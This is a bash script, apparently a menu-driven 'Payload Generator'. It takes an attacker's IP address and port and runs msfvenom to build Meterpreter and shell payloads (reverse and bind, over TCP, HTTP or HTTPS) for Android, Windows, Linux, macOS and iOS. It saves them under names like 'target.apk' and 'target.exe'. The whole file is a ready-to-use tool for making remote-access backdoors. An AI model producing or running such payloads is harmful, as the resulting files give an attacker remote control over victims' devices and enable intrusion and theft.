#!/bin/bash

    echo -e "===================================="
    echo -e "||        Payload Generator       ||"
    echo -e "===================================="
echo -e "\n[*] Checking Internet Connection \n"
if nc -zw1 google.com 443; then
    echo -e "\n[ ✔ ] Internet.............[ working ]"
else
    echo "No Internet Connection"
    exit 1
fi

sleep 0.5

echo -e "Enter Your IP Address: "
read -r lhost

echo -e "Enter Connection Port Number: "
read -r lport

function android() {
    echo -e "Choose Payload Creation Option\n"
    echo "[1] android/meterpreter/reverse_tcp"
    echo "[2] android/meterpreter/reverse_http"
    echo "[3] android/meterpreter/reverse_https"
    echo "[0] Back To Main Menu"

    read -r choose

    case $choose in
        1)
            payload="android/meterpreter/reverse_tcp"
            ;;
        2)
            payload="android/meterpreter/reverse_http"
            ;;
        3)
            payload="android/meterpreter/reverse_https"
            ;;
        0)
            menu
            ;;
        *)
            echo "Invalid Option"
            ;;
    esac
    echo -e "\n[+] Enter name of the output APK (e.g., target.apk): "
    read -r out

    sleep 2

    echo -e "\n[+] Generating Your APK Payload \n"
    sudo msfvenom -p "$payload"  LHOST="$lhost" LPORT="$lport" -o "$out"
}

function windows() {
    echo -e "Choose Payload Creation Option\n"
    echo "[1] windows/meterpreter/reverse_tcp"
    echo "[2] windows/meterpreter/reverse_https"
    echo "[3] windows/meterpreter/bind_tcp"
    echo "[4] windows/shell/reverse_tcp"
    echo "[5] windows/shell/bind_tcp"
    echo "[0] Back To Main Menu"

    read -r choose

    case $choose in
        1)
            payload="windows/meterpreter/reverse_tcp"
            ;;
        2)
            payload="windows/meterpreter/reverse_https"
            ;;
        3)
            payload="windows/meterpreter/bind_tcp"
            ;;
        4)
            payload="windows/shell/reverse_tcp"
            ;;
        5)
            payload="windows/shell/bind_tcp"
            ;;
        0)
            menu
            ;;
        *)
            echo "Invalid Option"
            ;;
    esac

    echo -e "\n[+] Enter name of payload (e.g., target.exe): "
    read -r out

    sleep 1

    echo -e "\n[+] Generating Your Windows Payload \n"
    sudo msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f exe -o "$out"

    if [[ ! -f "$out" ]]; then
        echo -e "\n[ X ] Payload Not Generated! Going to Sleep :)"
        sleep 1
        exit 1
    else
        echo -e "\n[ ✔ ] Windows Payload Saved As $out "
    fi
}

function linux() {
    echo -e "Choose Payload Creation Option\n"
    echo "[1] linux/x86/meterpreter_reverse_http"
    echo "[2] linux/x86/meterpreter_reverse_https"
    echo "[3] linux/x86/meterpreter/reverse_tcp"
    echo "[4] linux/x64/meterpreter_reverse_http"
    echo "[5] linux/x64/meterpreter_reverse_https"
    echo "[6] linux/x64/meterpreter/reverse_tcp"
    echo "[7] linux/x86/shell/reverse_tcp"
    echo "[8] linux/x64/shell/bind_tcp"
    echo "[9] linux/x86/meterpreter/bind_tcp"
    echo "[10] linux/x64/meterpreter/bind_tcp"
    echo "[11] linux/x86/shell/bind_tcp"
    echo "[12] linux/x64/shell/reverse_tcp"
    echo "[0] Back To Main Menu"

    read -r choose

    case $choose in
        1)
            payload="linux/x86/meterpreter_reverse_http"
            ;;
        2)
            payload="linux/x86/meterpreter_reverse_https"
            ;;
        3)
            payload="linux/x86/meterpreter/reverse_tcp"
            ;;
        4)
            payload="linux/x64/meterpreter_reverse_http"
            ;;
        5)
            payload="linux/x64/meterpreter_reverse_https"
            ;;
        6)
            payload="linux/x64/meterpreter/reverse_tcp"
            ;;
        7)
            payload="linux/x86/shell/reverse_tcp"
            ;;
        8)
            payload="linux/x64/shell/bind_tcp"
            ;;
        9)
            payload="linux/x86/meterpreter/bind_tcp"
            ;;
        10)
            payload="linux/x64/meterpreter/bind_tcp"
            ;;
        11)
            payload="linux/x86/shell/bind_tcp"
            ;;
        12)
            payload="linux/x64/shell/reverse_tcp"
            ;;
        0)
            menu
            ;;
        *)
            echo "Invalid Option"
            ;;
    esac

    echo -e "\n[+] Enter name of payload (e.g., target.elf): "
    read -r out

    sleep 1

    echo -e "\n[+] Generating Your Linux Payload \n"
    sudo msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f elf -o "$out"

    if [[ ! -f "$out" ]]; then
        echo -e "\n[ X ] Payload Not Generated! Going to Sleep :)"
        sleep 1
        exit 1
    else
        echo -e "\n[ ✔ ] Linux Payload Saved As $out "
    fi
}

function macos() {
    echo -e "Choose Payload Creation Option\n"
    echo "[1] osx/x86/shell_reverse_tcp"
    echo "[2] osx/x86/shell_bind_tcp"
    echo "[3] osx/x64/meterpreter/bind_tcp"
    echo "[4] osx/x64/meterpreter/reverse_tcp"
    echo "[5] osx/x64/meterpreter_reverse_http"
    echo "[6] osx/x64/meterpreter_reverse_https"
    echo "[0] Back To Main Menu"

    read -r choose

    case $choose in
        1)
            payload="osx/x86/shell_reverse_tcp"
            ;;
        2)
            payload="osx/x86/shell_bind_tcp"
            ;;
        3)
            payload="osx/x64/meterpreter/bind_tcp"
            ;;
        4)
            payload="osx/x64/meterpreter/reverse_tcp"
            ;;
        5)
            payload="osx/x64/meterpreter_reverse_http"
            ;;
        6)
            payload="osx/x64/meterpreter_reverse_https"
            ;;
        0)
            menu
            ;;
        *)
            echo "Invalid Option"
            ;;
    esac

    echo -e "\n[+] Enter name of payload (e.g., target.bin): "
    read -r out

    sleep 1

    echo -e "\n[+] Generating Your MacOS Payload \n"
    sudo msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f macho -o "$out"

    if [[ ! -f "$out" ]]; then
        echo -e "\n[ X ] Payload Not Generated! Going to Sleep :)"
        sleep 1
        exit 1
    else
        echo -e "\n[ ✔ ] MacOS Payload Saved As $out "
    fi
}

function ios() {
    echo -e "Choose Payload Creation Option\n"
    echo "[1] apple_ios/aarch64/meterpreter_reverse_http"
    echo "[2] apple_ios/aarch64/meterpreter_reverse_https"
    echo "[3] apple_ios/aarch64/meterpreter_reverse_tcp"
    echo "[4] apple_ios/aarch64/shell_reverse_tcp"
    echo "[5] apple_ios/armle/meterpreter_reverse_http"
    echo "[6] apple_ios/armle/meterpreter_reverse_https"
    echo "[7] apple_ios/armle/meterpreter_reverse_tcp"
    echo "[0] Back To Main Menu"

    read -r choose

    case $choose in
        1)
            payload="apple_ios/aarch64/meterpreter_reverse_http"
            ;;
        2)
            payload="apple_ios/aarch64/meterpreter_reverse_https"
            ;;
        3)
            payload="apple_ios/aarch64/meterpreter_reverse_tcp"
            ;;
        4)
            payload="apple_ios/aarch64/shell_reverse_tcp"
            ;;
        5)
            payload="apple_ios/armle/meterpreter_reverse_http"
            ;;
        6)
            payload="apple_ios/armle/meterpreter_reverse_https"
            ;;
        7)
            payload="apple_ios/armle/meterpreter_reverse_tcp"
            ;;
        0)
            menu
            ;;
        *)
            echo "Invalid Option"
            ;;
    esac

    echo -e "\n[+] Enter name of payload (e.g., target.macho): "
    read -r out

    sleep 1

    echo -e "\n[+] Generating Your Apple_IOS Payload \n"
    sudo msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f macho -o "$out"

    if [[ ! -f "$out" ]]; then
        echo -e "\n[ X ] Payload Not Generated! Going to Sleep :)"
        sleep 1
        exit 1
    else
        echo -e "\n[ ✔ ] Apple_IOS Payload Saved As $out "
    fi
}

function menu() {
    clear
    echo -e "===================================="
    echo -e "||        Payload Generator       ||"
    echo -e "===================================="
    echo -e "\n[*] Select Your Target OS\n"
    echo "[1] Android"
    echo "[2] Windows"
    echo "[3] Linux"
    echo "[4] MacOS"
    echo "[5] Apple_IOS"
    echo "[0] Exit"

    read -r os

    case $os in
        1)
            android
            ;;
        2)
            windows
            ;;
        3)
            linux
            ;;
        4)
            macos
            ;;
        5)
            ios
            ;;
        0)
            exit 0
            ;;
        *)
            echo "Invalid Option"
            ;;
    esac
}

menu
